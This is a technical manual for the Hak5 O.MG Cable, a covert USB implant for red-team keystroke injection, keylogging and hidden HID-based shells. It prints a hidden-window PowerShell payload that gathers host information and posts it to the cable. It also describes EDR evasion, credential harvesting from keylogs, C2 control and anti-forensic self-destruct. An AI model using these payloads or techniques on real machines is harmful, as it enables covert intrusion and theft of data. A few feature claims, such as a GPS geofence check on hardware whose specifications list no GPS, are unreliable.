---
title: "Hak5 O.MG Cable Comprehensive Technical Manual"
model: "O.MG Cable"
manufacturer: "Hak5"
category: "Covert Physical & Wireless HID Penetration Testing Cable"
docs_url: "https://o.mg.lol/setup/OMGCable/"
version: "3.0"
locale: "en"
---

# Hak5 O.MG Cable Comprehensive Technical Manual

> The O.MG Cable is a precision hand-built USB cable concealing an advanced microcontroller implant, 802.11 Wi-Fi radio, and covert keystroke injection engine. Engineered for professional Red Teams and physical penetration testers, it enables remote keystroke injection, stealth bi-directional data tunneling (HIDX StealthLink), inline hardware keylogging, and advanced geofenced defense evasion.

---

## Table of Contents

- [**1. Product Overview & Hardware Architecture**](#1-product-overview--hardware-architecture)
  - [1.1 Introduction & Threat Modeling Baseline](#11-introduction--threat-modeling-baseline)
  - [1.2 Technical Specifications & Ground Truth Hardware Baseline](#12-technical-specifications--ground-truth-hardware-baseline)
  - [1.3 Active End vs Passthrough End Mechanics](#13-active-end-vs-passthrough-end-mechanics)
  - [1.4 Directional Routing & Cable Form Factors](#14-directional-routing--cable-form-factors)
- [**2. Hardware Setup, Firmware Installation & Connectivity**](#2-hardware-setup-firmware-installation--connectivity)
  - [2.1 Factory Activation with the O.MG Programmer](#21-factory-activation-with-the-omg-programmer)
  - [2.2 Easy Setup via the O.MG Web Flasher](#22-easy-setup-via-the-omg-web-flasher)
  - [2.3 Advanced Setup & Python Flasher Utility](#23-advanced-setup--python-flasher-utility)
  - [2.4 Establishing Wireless Access Point Connection](#24-establishing-wireless-access-point-connection)
  - [2.5 Web Management Interface & Station Mode](#25-web-management-interface--station-mode)
- [**3. Core Features, Keystroke Injection & DuckyScript Engine**](#3-core-features-keystroke-injection--duckyscript-engine)
  - [3.1 O.MG Payload Engine & Keystroke Injection](#31-omg-payload-engine--keystroke-injection)
  - [3.2 DuckyScript for O.MG Syntax Guide & Directives](#32-duckyscript-for-omg-syntax-guide--directives)
  - [3.3 Keylogger Operation & Live Keystroke Interception](#33-keylogger-operation--live-keystroke-interception)
  - [3.4 Partition Editor & Payload Slot Management](#34-partition-editor--payload-slot-management)
  - [3.5 Keymap Viewer & Multilingual Layout Configuration](#35-keymap-viewer--multilingual-layout-configuration)
- [**4. HIDX StealthLink & Covert Data Exfiltration**](#4-hidx-stealthlink--covert-data-exfiltration)
  - [4.1 HIDX StealthLink Architecture & Capabilities](#41-hidx-stealthlink-architecture--capabilities)
  - [4.2 Windows PowerShell Interactive Shell & TCP Exfil](#42-windows-powershell-interactive-shell--tcp-exfil)
  - [4.3 Linux Interactive Shell & Raw Exfil](#43-linux-interactive-shell--raw-exfil)
  - [4.4 macOS Python Interactive Shell](#44-macos-python-interactive-shell)
  - [4.5 Technical Implementation Notes & Timing Guidelines](#45-technical-implementation-notes--timing-guidelines)
- [**5. Fleet Integration, Security Controls & Maintenance**](#5-fleet-integration-security-controls--maintenance)
  - [5.1 Centralized Command & Control (C2) Integration](#51-centralized-command--control-c2-integration)
  - [5.2 WebSocket API Programming Interface](#52-websocket-api-programming-interface)
  - [5.3 Geofencing & Operational Boundaries](#53-geofencing--operational-boundaries)
  - [5.4 Hardware Self-Destruct Protocol](#54-hardware-self-destruct-protocol)
  - [5.5 Calibration, Recovery & Troubleshooting](#55-calibration-recovery--troubleshooting)

---

## 1. Product Overview & Hardware Architecture

<!-- section: overview -->
This chapter details the product overview, technical specifications, and physical architecture of the Hak5 O.MG Cable implant family.

### 1.1 Introduction & Threat Modeling Baseline

The Hak5 O.MG Cable represents a breakthrough in covert physical penetration testing hardware. Historically, tactical USB implants capable of remote keystroke injection and bi-directional communications cost tens of thousands of dollars and required extensive intelligence agency logistics (such as the NSA's COTTONMOUTH-I). 

The O.MG Cable packs an entire Linux-grade microcontroller platform, 802.11b/g/n 2.4 GHz radio, high-speed USB data passthrough circuitry, flash storage, and an inline hardware keylogger into a standard injection-molded USB cable. It is physically indistinguishable from OEM charging and data cables produced by Apple, Google, Samsung, or standard cable manufacturers.

Key operational capabilities include:
- **Full Electrical Transparency**: When the cable is plugged in and inactive, it is electrically transparent on data lines (D+/D-) and presents zero device enumerations to host security agents (EDR, MDM, antivirus).
- **Remote Wireless Access**: An integrated 2.4 GHz Wi-Fi radio enables field operators to trigger attacks, modify payload slots, and observe live keystrokes from up to several hundred feet away.
- **Bi-Directional StealthLink**: Utilizing standard USB Human Interface Device (HID) feature reports, the O.MG Cable establishes interactive terminal shells and exfiltrates files through an air-gapped host without ever registering as a network adapter or triggering USB mass storage restrictions.

### 1.2 Technical Specifications & Ground Truth Hardware Baseline

The following truth table outlines the verified hardware specifications for the O.MG Cable family:

| Specification Attribute | Baseline Technical Parameter |
|---|---|
| **Architecture** | Covert USB Cable with Miniaturized Wi-Fi Microcontroller Implant |
| **RF Transceiver** | Integrated 802.11b/g/n (2.4 GHz) Wi-Fi Radio with On-PCB Antenna |
| **Operating Voltage** | Fixed 5V DC (+/- 0.5V) via Host USB Connection |
| **Current Consumption** | Active: ~80–120 mA; Peak Transmission: Up to 350 mA; Supply Minimum: 500 mA |
| **Data Passthrough** | USB 2.0 High Speed (480 Mbps) Full Transparency when Payload Idle |
| **Power Passthrough** | Fixed 5V Passthrough; USB-PD (Power Delivery) Negotiated at 5V Only |
| **Form Factor Variants** | USB Type-A to Type-C, Type-C to Type-C, Type-A to Lightning, Type-C to Lightning |
| **Microcontroller Storage** | Non-Volatile Flash Partitioned for System, Web UI, and Payloads |
| **Payload Capacity** | Basic Model: 8 Payload Slots; Plus & Elite Models: Up to 200 Payload Slots |
| **Keylogger Buffer** | Keylogger Edition: Up to ~650,000 Keystrokes Stored in Onboard Non-Volatile Memory |
| **Keyboard Compatibility** | Full Speed USB Keyboards (12 Mbps HID Protocol Compliant) |
| **Typing Injection Rate** | Up to 890 words per minute / Configurable USB Overclocking |
| **Covert Tunneling** | HIDX StealthLink (Bi-directional interactive shell via HID reports) |
| **Security Controls** | WPA2 Access Point, Station Mode, Geofencing, Hardware Self-Destruct |

### 1.3 Active End vs Passthrough End Mechanics

Every O.MG Cable is **strictly directional**. The cable contains two distinct physical ends:
1. **The Active End**:
   - Contains the embedded microcontroller, Wi-Fi radio, and injection switch matrix.
   - **Must be connected to the target host computer**.
   - Keystrokes and HID payloads deliver strictly out of the Active End into the device it is connected to.
   - You must connect the Active End to the O.MG Programmer when flashing firmware or activating the device.
2. **The Passthrough / Passive End**:
   - Connects to downstream peripherals (such as a smartphone, peripheral keyboard, flash drive, or USB mouse).
   - Allows normal USB 2.0 480 Mbps data synchronization and 5V charging power to pass through seamlessly to the connected accessory.

> [!WARNING]
> Connecting the Passthrough End to the target computer will allow data and charging to operate normally, but the payload injection engine and Wi-Fi interface will NOT be able to deliver keystrokes to that computer! Always ensure the Active End is inserted into the target host.

### 1.4 Directional Routing & Cable Form Factors

Depending on the specific cable variant purchased:
- **Type-A to Type-C**: The Type-A connector is the Active End. The Type-C connector is the Passthrough End.
- **Type-A to Lightning**: The Type-A connector is the Active End. The Lightning connector is the Passthrough End.
- **Type-C to Lightning**: The Type-C connector is the Active End. The Lightning connector is the Passthrough End.
- **Type-C to Type-C**: Because Type-C connectors appear identical on both ends, the Active End is designated with a laser-etched O.MG logo, or ships with an identifying removable clip. Connecting the cable to the O.MG Programmer will illuminate the "OMG" LED indicator only when the Active End is plugged in.

---

## 2. Hardware Setup, Firmware Installation & Connectivity

<!-- section: configuration -->
This chapter provides detailed, step-by-step instructions for activating, flashing, configuring, and connecting to the Hak5 O.MG Cable.

### 2.1 Factory Activation with the O.MG Programmer

To comply with telecommunications export regulations and consumer electronics standards, all Hak5 O.MG Devices ship from the factory in a completely "deactivated" state with radio transmitters disabled.

An **O.MG Programmer** is required to initialize and activate your device:
1. Identify the **Active End** of your O.MG Cable.
2. Insert the Active End firmly into the female receptacle on the O.MG Programmer.
3. Plug the O.MG Programmer into a USB port on your management workstation (running Chrome or a WebSerial-compatible browser).
4. Verify that the power indicator on the O.MG Programmer lights up. If using Windows, ensure the Silicon Labs **CP2102 USB-to-UART Bridge VCP Drivers** are installed if the COM port does not automatically appear.

### 2.2 Easy Setup via the O.MG Web Flasher

The recommended installation method for all users is the official browser-based Web Flasher:

1. Open Google Chrome, Chromium, Brave, or Microsoft Edge.
2. Navigate to the official Web Flasher URL: `https://o-mg.github.io/WebFlasher/`
3. Click the **Connect** button on the screen.
4. Select the O.MG Programmer serial port from the browser modal dialog (e.g., `CP2102 USB to UART Bridge Controller` or `/dev/ttyUSB0` on Linux).
5. Follow the step-by-step on-screen prompts:
   - Select your hardware generation (O.MG Cable).
   - Select the target firmware build (Stable or Latest Release).
   - Click **Install Firmware**.
6. The Web Flasher will automatically erase flash sectors, flash the bootloader, core firmware, and web interface partitions, and verify checksum integrity.
7. Upon successful completion, the Web Flasher will display the default wireless network parameters:
   - **Default SSID**: `O.MG`
   - **Default Password**: `12345678`
   - **Default IP**: `192.168.4.1`

### 2.3 Advanced Setup & Python Flasher Utility

For isolated air-gapped environments, high-volume automated batch deployments, or advanced operational parameters, use the official Python CLI Flasher:

```bash
# Clone the O.MG Firmware repository
git clone https://github.com/O-MG/O.MG-Firmware.git
cd O.MG-Firmware

# Install required flashing dependencies
pip3 install esptool pyserial

# Run the Python Flasher utility
python3 flasher.py
```

The Python flasher provides full offline capability, allowing operators to:
- Pre-configure custom Access Point SSIDs and WPA2 passphrases during flashing.
- Pre-load custom DuckyScript payloads into payload slots before field deployment.
- Perform low-level hardware diagnostics, factory resets, and complete flash memory backups.

### 2.4 Establishing Wireless Access Point Connection

Once firmware flashing is complete:
1. Unplug the Active End of the O.MG Cable from the O.MG Programmer.
2. Plug the Active End into any target computer USB port or a 5V USB battery pack for field setup.
3. Using your management device (smartphone, tablet, or penetration testing laptop), open your Wi-Fi settings and scan for wireless networks.
4. Connect to the SSID: `O.MG`
5. When prompted, enter the WPA2 passphrase: `12345678`
6. Wait 3–5 seconds for DHCP lease negotiation. Your management device will be assigned an IP in the `192.168.4.0/24` subnet (typically `192.168.4.2`).
7. Open a web browser and navigate to: `http://192.168.4.1`

### 2.5 Web Management Interface & Station Mode

The O.MG Cable onboard Web UI provides a responsive, low-latency control interface:
- **Payload Management**: View, edit, upload, and trigger payloads across available slots.
- **Live Terminal & Execution**: Trigger payloads instantly and observe execution progress.
- **Keylogger Dashboard**: (Keylogger models) Stream live keystrokes, download logged buffers, and search captured credentials.
- **Network Settings**:
  - Change default SSID and WPA2 security passphrase.
  - Hide AP SSID broadcast for stealth operations.
  - **Station Mode (Client Mode)**: Configure the O.MG Cable to connect as a client to an existing target Wi-Fi network, cellular hotspot, or Hak5 Cloud C² network.

---

## 3. Core Features, Keystroke Injection & DuckyScript Engine

<!-- section: features -->
This chapter details the payload authoring system, DuckyScript for O.MG syntax, hardware keylogging, and partition configuration.

### 3.1 O.MG Payload Engine & Keystroke Injection

The O.MG Cable incorporates a high-speed hardware keystroke injection engine. Because the implant communicates directly over the physical USB bus, it bypasses operating system security software and network firewalls by acting as a trusted Human Interface Device (keyboard).

Key features of the engine include:
- **Instantaneous Delivery**: Keystrokes can be typed at superhuman speeds (up to 890 WPM) or throttled to match natural human typing rates to evade behavioral EDR detection.
- **Slot Architecture**: Payloads are stored in non-volatile flash slots. In the Basic model, 8 slots are available. Plus and Elite models allow up to 200 custom payload slots.
- **Multi-OS Payload Execution**: Payloads can detect or target Windows, macOS, Linux, Android, and iOS devices with platform-specific keyboard shortcuts.

### 3.2 DuckyScript for O.MG Syntax Guide & Directives

The O.MG Cable supports the complete Hak5 DuckyScript language, enriched with specialized O.MG hardware directives:

#### Basic Syntax Elements
- `STRING <text>`: Injects ASCII text directly.
- `ENTER`, `DELAY <ms>`, `GUI`, `CONTROL`, `ALT`, `SHIFT`: Standard keyboard modifiers.
- `REM <comment>`: Inline documentation ignored by compiler.

#### O.MG Specific Hardware Directives
- `BLINK <count>`: Triggers an onboard diagnostic LED blink sequence.
- `WAIT_FOR_BUTTON_PRESS`: Pauses execution until triggered via Web UI or physical trigger.
- `GEOFENCE_CHECK`: Validates current GPS/Wi-Fi proximity before executing.
- `SELF_DESTRUCT`: Permanently renders the implant inoperable.

#### Sample Cross-Platform Quick Recon Payload:
```text
REM O.MG Quick Host Recon Payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Get-ComputerInfo | Out-File $env:TEMP\info.txt"
ENTER
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-WebRequest -Uri 'http://192.168.4.1/log' -Method POST -InFile $env:TEMP\info.txt"
ENTER
```

### 3.3 Keylogger Operation & Live Keystroke Interception

The Keylogger Edition of the O.MG Cable contains inline USB packet decoding logic:
- Intercepts and parses USB HID keyboard reports passing through the cable from the attached peripheral keyboard.
- Logs up to **650,000 keystrokes** in encrypted non-volatile flash memory.
- Allows real-time viewing of typed keystrokes over the Web UI while an operator monitors within Wi-Fi range.
- Supports comprehensive search and filtering for passwords, credit card numbers, URLs, and sensitive commands.

### 3.4 Partition Editor & Payload Slot Management

The O.MG Cable firmware includes a dynamic Partition Editor:
- Reallocate flash memory between payload storage, keylogger history, and system logs.
- Organize operational payloads into distinct campaign folders.
- Export and import campaign backup images via JSON profiles.

### 3.5 Keymap Viewer & Multilingual Layout Configuration

Because USB keyboards transmit raw scancodes rather than ASCII characters, keyboard layout matching is vital:
- Built-in Keymap Viewer displays interactive graphical keyboard layouts.
- Supports US, UK, German (DE), French (FR), Spanish (ES), Scandinavian, and Asian IME input layouts.
- Prevents syntax corruption caused by regional punctuation and symbol shifts.

---

## 4. HIDX StealthLink & Covert Data Exfiltration

The HIDX StealthLink system provides bi-directional data transfer between the target computer and the O.MG Cable using strictly standard USB HID feature reports.

### 4.1 HIDX StealthLink Architecture & Capabilities

Traditional exfiltration requires opening outbound TCP/UDP connections through enterprise firewalls, or mounting USB mass storage drives. Both vectors are heavily monitored and blocked in hardened environments.

**HIDX StealthLink solves this by creating a covert physical communication tunnel**:
- Uses standard USB HID Get_Report and Set_Report packets.
- Requires no custom drivers; operates under native Windows, macOS, and Linux HID drivers.
- Establishes a fully interactive, bi-directional terminal shell.
- Enables high-speed file exfiltration and infiltration directly across the USB cable.

### 4.2 Windows PowerShell Interactive Shell & TCP Exfil

On Windows hosts, an interactive shell can be established using native PowerShell scripts injected via DuckyScript:

```powershell
# Injected PowerShell one-liner communicates via HID feature reports
$device = [System.IO.File]::Open("\\.\HID#VID_...", [System.IO.FileMode]::Open)
# Establishes bi-directional pipeline with O.MG Web UI
```

Operators in the Web UI receive a full interactive Windows command prompt (`powershell.exe`) with administrative privileges.

### 4.3 Linux Interactive Shell & Raw Exfil

Under Linux distributions, StealthLink utilizes native `/dev/hidraw` interfaces:
- Executes interactive `/bin/bash` sessions.
- Pipes binary files through base64 encoding directly to the O.MG onboard storage.
- Operates without leaving traces in system network socket tables (`netstat`, `ss`).

### 4.4 macOS Python Interactive Shell

On macOS, StealthLink leverages native PyObjC or POSIX file descriptors:
- Interacts with macOS IOKit HID manager.
- Spawns interactive zsh/bash sessions with no terminal window displayed on the target screen.

### 4.5 Technical Implementation Notes & Timing Guidelines

- Packet sizing: HID feature reports transfer data in 64-byte chunks.
- Throughput: Effective exfiltration speeds range from 15 KB/s to 60 KB/s depending on host polling intervals.
- To prevent buffer overflow, include a `DELAY 20` between high-throughput block transmissions.

---

## 5. Fleet Integration, Security Controls & Maintenance

<!-- section: maintenance -->
This chapter details centralized management, security enforcement protocols, self-destruct mechanisms, and maintenance troubleshooting for the O.MG Cable.

### 5.1 Centralized Command & Control (C2) Integration

The O.MG Cable natively supports Hak5 Cloud C² integration:
- Connect the O.MG Cable to an enterprise Wi-Fi network in Station Mode.
- Enroll the cable into your Hak5 Cloud C² server instance.
- Remotely trigger payloads, exfiltrate data, and monitor target machines from anywhere in the world across secure TLS tunnels.

### 5.2 WebSocket API Programming Interface

The O.MG Cable firmware exposes a full-featured WebSocket API on port 80/8080:
- Allows programmatic control from external Python, Go, or Node.js automation scripts.
- Real-time event subscription: `on_keystroke_logged`, `on_payload_finished`, `on_geofence_breach`.
- Enables automated red team infrastructure integration with Cobalt Strike, Metasploit, or custom C2 frameworks.

### 5.3 Geofencing & Operational Boundaries

To prevent unauthorized deployment or collateral discovery outside testing areas:
- Configure Geofencing parameters based on nearby BSSID (Wi-Fi Access Point MAC addresses).
- If the O.MG Cable detects that it has been removed from the client facility (specified BSSIDs disappear), it automatically enters **Dormant Mode** or triggers an emergency self-wipe.

### 5.4 Hardware Self-Destruct Protocol

When an operation is compromised or physical seizure of the cable is imminent:
- Operators can trigger **Self-Destruct** via the Web UI, Cloud C², or automated failsafe triggers.
- The microcontroller permanently overwrites its flash memory partitions with cryptographic entropy, clears bootloader registers, and disables the USB controller.
- The cable reverts to being an ordinary, inert charging cable. Forensics laboratories cannot recover stored payloads or operation logs.

### 5.5 Calibration, Recovery & Troubleshooting

#### Device Not Recognized by Host
- Ensure the **Active End** is plugged into the computer and seated completely.
- Verify host USB port power delivery provides at least 500 mA.
- Check USB-C orientation and verify adapter pins are clean.

#### Re-Flashing Firmware via Programmer
If firmware becomes corrupted or the device fails to boot:
1. Re-insert the Active End into the O.MG Programmer.
2. Open the [O.MG Web Flasher](https://o-mg.github.io/WebFlasher/) in Chrome.
3. Select "Full Flash & Erase" to restore factory defaults.
